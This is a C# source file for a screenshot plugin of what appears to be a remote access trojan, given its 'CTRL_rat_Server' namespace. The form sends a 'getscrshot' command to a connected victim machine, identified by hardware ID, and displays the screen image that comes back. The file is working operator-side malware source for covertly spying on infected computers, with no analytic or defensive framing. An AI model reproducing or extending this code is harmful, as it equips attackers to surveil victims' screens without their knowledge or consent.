using CTRL_rat_Server;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server_plugin_dll
{
    public partial class screenshot : Form
    {
        node client;
        CTRL_rat_Server.Main parent;
        string workerid;
        public Bitmap ByteToImage(byte[] blob)
        {
            MemoryStream mStream = new MemoryStream();
            byte[] pData = blob;
            mStream.Write(pData, 0, Convert.ToInt32(pData.Length));
            Bitmap bm = new Bitmap(mStream, false);
            mStream.Dispose();
            return bm;
        }
        public screenshot(node _client, CTRL_rat_Server.Main _parent)
        {
            client = _client;
            parent = _parent;
            workerid = client.generate_random_id();
            InitializeComponent();
            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
        }
        public void set_picture(Bitmap image)
        {
            pictureBox1.Invoke((MethodInvoker)(() =>
            {
                pictureBox1.Image = image;
            }));

        }
        public byte[] objecttobyte(object[] e)
        {
            int len = 0;
            byte[] built = new byte[e.Length];
            foreach (int i in e)
            {
                built[len] = Convert.ToByte(i);
                len++;
            }
            return built;
        }
        public void OnMessage(node _client, Dictionary<object, object> response)
        {
            if (_client.hwid != client.hwid) return;
            if ((string)response["op"] == "retscrshot")
            {
                byte[] image = objecttobyte(response["data"] as object[]);
                set_picture(ByteToImage(image));
            }
        }
        private void button1_Click_1(object sender, EventArgs e)
        {
            var g = client.get_or_create_worker_node(workerid);
            var payload = new Dictionary<object, object>();
            payload["op"] = "getscrshot";
            g.Send(g.sock, Encoding.UTF8.GetBytes(g.DictionaryToJson(payload)));
        }
    }
}
